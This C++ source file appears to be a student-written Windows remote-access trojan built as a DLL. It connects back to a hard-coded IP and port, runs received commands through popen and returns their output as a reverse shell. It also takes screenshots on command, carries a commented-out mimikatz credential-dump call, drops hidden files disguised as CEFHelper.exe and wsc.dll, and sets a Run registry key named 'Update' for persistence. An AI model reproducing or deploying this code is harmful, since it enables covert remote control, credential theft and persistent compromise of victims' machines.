#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
//#include <stdlib.h>
#include <iostream>
#include <string>
#include <string.h>
#include "header.h"
#include "data.cpp"

//#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

void MakeTheProgram(){
    char username[30];
    DWORD username_len = 30;
    GetUserName(username, &username_len);


    char path[100] = "C:\\Users\\";
    strcat(path, username);
    strcat(path, "\\AppData\\Local\\Temp\\CEFHelper.exe");


    HANDLE hFile;
    hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
    if(hFile != INVALID_HANDLE_VALUE){
        long long lenData = (sizeof(programData)) + 1;
        WriteFile(hFile, programData, lenData, NULL, NULL);
        CloseHandle(hFile);
    }
}

void MakeTheDLL(){
    char username[30];
    DWORD username_len = 30;
    GetUserName(username, &username_len);


    char path[100] = "C:\\Users\\";
    strcat(path, username);
    strcat(path, "\\AppData\\Local\\Temp\\wsc.dll");


    HANDLE hFile;
    hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
    if(hFile != INVALID_HANDLE_VALUE){
        long long lenData = (sizeof(dllData)) + 1;
        WriteFile(hFile, dllData, lenData, NULL, NULL);
        CloseHandle(hFile);
    }

}

void MakeTheProgramRun(){
    HKEY hKey;
    
    if(RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS ){
        if(RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS){
            
            char username[30];
            DWORD username_len = 30;
            GetUserName(username, &username_len);
            char path[100] = "C:\\Users\\";
            strcat(path, username);

            strcat(path, "\\AppData\\Local\\Temp\\CEFHelper.exe");

            if (RegSetValueExA(hKey, "Update", 0, REG_SZ, (LPBYTE)path, DWORD(sizeof(path))) != ERROR_SUCCESS){
                std::cout << "Error";
            }
            std::cout << GetLastError() << "\n";
            
        }
        else{
            std::cout << "\nCannot Create Key";
        }
    }
    else{
        std::cout << "\nCannot Open Key";
    }
}


//server connect to ip, start listen to that IP
//Tren may nan nhan

void credenDump(){
    //system("mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > log.txt");
}


std::string exec(const char* cmd) {
    //std::cout << "DEBUG";
    std::array<char, 30000> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    //if (!pipe) {
    //    throw std::runtime_error("popen() failed!");
    //}
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        //std::cout << buffer.data() << "\n";
        result += buffer.data();

    }
    //std::cout << "DONE";
    return result;
}

string findStr(){
    string search = "DHCP Server";
    ifstream inFile;
    string line;

    //cin >> search;

    inFile.open("data.txt");
    size_t pos;

    while(inFile.good()){
        getline(inFile, line);
        pos = line.find(search);

        if(pos != string::npos){
            getline(inFile, line);
            getline(inFile, line);
            //cout << line;
            //cout << "Found";

            int p = line.find(": ");

            string sub = line.substr(p + 1);
            return sub;

            break;
        }
    }
    string fault = "";
    return fault;
}


void screenshot(){
    //OutputString(L"Sending 'Win-D'\r\n");
    INPUT inputs[4] = {};
    ZeroMemory(inputs, sizeof(inputs));

    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = VK_LWIN;
   
    inputs[1].type = INPUT_KEYBOARD;
    inputs[1].ki.wVk = VK_SNAPSHOT;

    inputs[2].type = INPUT_KEYBOARD;
    inputs[2].ki.wVk = VK_SNAPSHOT;
    inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;

    inputs[3].type = INPUT_KEYBOARD;
    inputs[3].ki.wVk = VK_LWIN;
    inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

    UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
    if (uSent != ARRAYSIZE(inputs))
    {
        //OutputString(L"SendInput failed: 0x%x\n", HRESULT_FROM_WIN32(GetLastError()));
    } 
}

void testfunc(){
    std::cout << "test";
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){
    //HWND hWnd = FindWindowA(NULL, "CEFHelper.exe");
    //ShowWindow(hWnd, SW_HIDE);
	//MakeTheProgram();
    //MakeTheDLL();
    //std::cout << "haha";
    //MakeTheProgramRun();
    testfunc();
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char sendbuf[] = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        //printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("192.168.0.103", DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        //printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            //printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }


    if (ConnectSocket == INVALID_SOCKET) {
        //printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }


    int iSendResult;
    string rs;
    do{
        memset(recvbuf, 0, sizeof(recvbuf));
        recvbuflen = 300000;
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);

       // std::cout << "\nreceive: " << recvbuf << "\n";
        
        if(iResult > 0){

            //std::cout << "\nMessage receive: " << recvbuf;

            if(stricmp(recvbuf, "TakeScreenshot") == 0){
                screenshot();
                iSendResult = send(ConnectSocket, "TakeScreenshot", strlen("TakeScreenshot"), 0);
            }
            else if(stricmp(recvbuf, "cls") == 0){
                system("cls");
                iSendResult = send(ConnectSocket, "Done Cls", strlen("Done Cls"), 0);
            }
            else if(stricmp(recvbuf, "exit") == 0){
                TerminateProcess(GetCurrentProcess(), 0);
            }
            else if(stricmp(recvbuf, "credump") == 0){
                credenDump();
            }
            else if(strcmp(recvbuf,"") == 0){
                ConnectSocket = accept(ConnectSocket, NULL, NULL);
            }

            else{
                rs = "";
                
                rs = (string)exec(recvbuf);
                if(rs == "")
                    rs = "No command";
                

                char p[rs.length()];
                memset(p, 0, sizeof(p));

                for (int a = 0; a < sizeof(p); a++){
                    //std::cout << rs[a] << ", ";
                    p[a] = rs[a];
                }


                iSendResult = send(ConnectSocket, p, sizeof(p), 0);
            }
            //std::cout << iSendResult;
        }
        else{
            //iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        }

    }
    while(1);



    freeaddrinfo(result);
    WSACleanup();


    return TRUE;

}